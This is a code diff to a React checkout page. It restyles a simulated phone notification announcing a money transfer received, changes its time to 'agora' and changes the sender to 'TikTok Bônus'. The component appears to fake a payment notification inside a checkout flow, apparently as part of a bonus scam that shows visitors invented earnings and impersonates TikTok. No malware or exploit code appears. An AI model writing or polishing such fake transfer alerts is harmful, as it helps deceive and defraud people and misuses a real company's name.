@@ -70,12 +70,12 @@ const Checkout = () => {
           style={{ animation: "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)" }}
         >
           <div
-            className="rounded-[20px] p-4 mx-auto max-w-md border border-white/30"
+            className="rounded-[20px] p-4 mx-auto max-w-md border border-white/10"
             style={{
-              background: "linear-gradient(135deg, rgba(200,200,200,0.55) 0%, rgba(180,180,180,0.45) 100%)",
+              background: "linear-gradient(135deg, rgba(40,40,40,0.85) 0%, rgba(30,30,30,0.9) 100%)",
               backdropFilter: "blur(40px)",
               WebkitBackdropFilter: "blur(40px)",
-              boxShadow: "0 8px 32px rgba(0,0,0,0.18), inset 0 1px 0 rgba(255,255,255,0.3)",
+              boxShadow: "0 8px 32px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.08)",
             }}
           >
             <div className="flex items-start gap-3">
@@ -86,11 +86,11 @@ const Checkout = () => {
               />
               <div className="flex-1 min-w-0">
                 <div className="flex items-baseline justify-between gap-2 mb-0.5">
-                  <span className="text-[15px] font-bold text-gray-900 leading-tight">Transferência recebida</span>
-                  <span className="text-[12px] text-gray-500 shrink-0 font-medium">{notifTime}</span>
+                  <span className="text-[15px] font-bold text-white leading-tight">Transferência recebida</span>
+                  <span className="text-[12px] text-white/50 shrink-0 font-medium">agora</span>
                 </div>
-                <p className="text-[13px] text-gray-800 leading-snug mt-0.5">
-                  Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de Super Pagamentos e Tecnologia LTDA.
+                <p className="text-[13px] text-white/80 leading-snug mt-0.5">
+                  Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
                 </p>
               </div>
             </div>
